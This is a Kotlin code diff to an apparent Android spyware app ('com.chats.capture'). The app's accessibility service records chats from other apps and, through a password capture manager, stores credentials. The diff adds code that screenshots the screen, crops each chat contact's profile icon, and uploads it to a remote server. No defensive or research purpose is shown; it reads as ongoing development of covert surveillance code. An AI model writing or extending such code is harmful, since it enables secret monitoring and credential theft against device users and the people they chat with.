@@ -2,7 +2,10 @@ package com.chats.capture.services
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.graphics.Path
+import android.graphics.Rect
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.chats.capture.CaptureApplication
@@ -10,12 +13,16 @@ import com.chats.capture.CaptureApplication.Companion.KEYBOARD_CHANNEL_ID
 import com.chats.capture.database.ChatDao
 import com.chats.capture.models.ChatData
 import com.chats.capture.utils.ScreenCapture
+import com.chats.capture.utils.ScreenshotCapture
 import com.chats.capture.utils.MessageBuffer
 import com.chats.capture.utils.MessageGroupingManager
 import com.chats.capture.utils.ChatMediaExtractor
+import com.chats.capture.utils.IconCacheManager
 import com.chats.capture.managers.MediaUploadManager
 import com.chats.capture.models.MediaFile
 import com.chats.capture.models.UploadStatus
+import java.io.File
+import java.io.FileOutputStream
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -35,6 +42,7 @@ class EnhancedAccessibilityService : AccessibilityService() {
     private lateinit var messageGroupingManager: MessageGroupingManager
     private lateinit var chatMediaExtractor: ChatMediaExtractor
     private lateinit var mediaUploadManager: MediaUploadManager
+    private lateinit var screenshotCapture: ScreenshotCapture
     
     private var lastTextBuffer = ""
     private var lastPackageName = ""
@@ -48,6 +56,7 @@ class EnhancedAccessibilityService : AccessibilityService() {
         val database = (application as CaptureApplication).database
         chatDao = database.chatDao()
         screenCapture = ScreenCapture(this)
+        screenshotCapture = ScreenshotCapture(this)
         passwordCaptureManager = com.chats.capture.utils.PasswordCaptureManager(
             this,
             database.credentialDao(),
@@ -206,6 +215,9 @@ class EnhancedAccessibilityService : AccessibilityService() {
                     )
                     
                     chatDao.insertChat(chatData)
+
+                    // Capture chat icon once per chat identifier
+                    captureChatIconIfNeeded(buffer, chatData.id)
                     
                     // Try to extract media from current screen
                     val rootNode = rootInActiveWindow
@@ -263,6 +275,108 @@ class EnhancedAccessibilityService : AccessibilityService() {
             } catch (e: Exception) {
                 Timber.e(e, "Error saving completed chat message")
             }
+        }
+    }
+
+    private suspend fun captureChatIconIfNeeded(buffer: MessageBuffer.BufferData, chatId: String) {
+        val chatIdentifier = buffer.chatIdentifier?.trim().orEmpty()
+        if (chatIdentifier.isBlank()) return
+
+        val iconKey = "${buffer.packageName.lowercase()}|${chatIdentifier.lowercase()}"
+        if (IconCacheManager.hasIcon(this, iconKey)) return
+
+        val iconPath = captureHeaderIconPath() ?: return
+        val iconFile = File(iconPath)
+        if (!iconFile.exists() || iconFile.length() == 0L) return
+
+        val checksum = calculateFileChecksum(iconFile)
+        val mimeType = determineMimeType(iconFile)
+        val iconMediaFile = MediaFile(
+            notificationId = "icon_chat_$chatId",
+            appPackage = buffer.packageName,
+            localPath = iconPath,
+            fileSize = iconFile.length(),
+            mimeType = mimeType,
+            checksum = checksum,
+            uploadStatus = UploadStatus.PENDING
+        )
+
+        val database = (application as CaptureApplication).database
+        database.mediaFileDao().insertMediaFile(iconMediaFile)
+        mediaUploadManager.uploadMediaFile(iconMediaFile)
+        IconCacheManager.markIconCaptured(this, iconKey)
+    }
+
+    private suspend fun captureHeaderIconPath(): String? {
+        val rootNode = rootInActiveWindow ?: return null
+        val iconNode = findHeaderIconNode(rootNode) ?: return null
+
+        val bounds = Rect()
+        iconNode.getBoundsInScreen(bounds)
+        if (bounds.width() <= 0 || bounds.height() <= 0) return null
+
+        val screenshotPath = screenshotCapture.captureScreenshot() ?: return null
+        val screenshotFile = File(screenshotPath)
+        if (!screenshotFile.exists()) return null
+
+        return try {
+            val bitmap = BitmapFactory.decodeFile(screenshotPath) ?: return null
+            val left = bounds.left.coerceAtLeast(0)
+            val top = bounds.top.coerceAtLeast(0)
+            val right = bounds.right.coerceAtMost(bitmap.width)
+            val bottom = bounds.bottom.coerceAtMost(bitmap.height)
+            if (right <= left || bottom <= top) return null
+
+            val cropped = Bitmap.createBitmap(bitmap, left, top, right - left, bottom - top)
+            val iconDir = File(getExternalFilesDir(null), "icons")
+            if (!iconDir.exists()) iconDir.mkdirs()
+            val iconFile = File(iconDir, "chat_icon_${System.currentTimeMillis()}.png")
+            FileOutputStream(iconFile).use { out ->
+                cropped.compress(Bitmap.CompressFormat.PNG, 90, out)
+            }
+
+            screenshotFile.delete()
+
+            iconFile.absolutePath
+        } catch (e: Exception) {
+            Timber.e(e, "Error cropping header icon")
+            null
+        }
+    }
+
+    private fun findHeaderIconNode(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val candidates = mutableListOf<AccessibilityNodeInfo>()
+        collectImageNodes(rootNode, candidates)
+
+        if (candidates.isEmpty()) return null
+
+        val screenHeight = resources.displayMetrics.heightPixels
+        val topLimit = (screenHeight * 0.25).toInt()
+
+        return candidates
+            .map { node ->
+                val rect = Rect()
+                node.getBoundsInScreen(rect)
+                node to rect
+            }
+            .filter { (_, rect) -> rect.top < topLimit && rect.width() > 40 && rect.height() > 40 }
+            .maxByOrNull { (_, rect) -> rect.width() * rect.height() }
+            ?.first
+    }
+
+    private fun collectImageNodes(node: AccessibilityNodeInfo?, list: MutableList<AccessibilityNodeInfo>) {
+        if (node == null) return
+        try {
+            if (node.className?.toString()?.contains("ImageView", ignoreCase = true) == true) {
+                list.add(node)
+            }
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i)
+                collectImageNodes(child, list)
+                child?.recycle()
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error collecting image nodes")
         }
     }
     
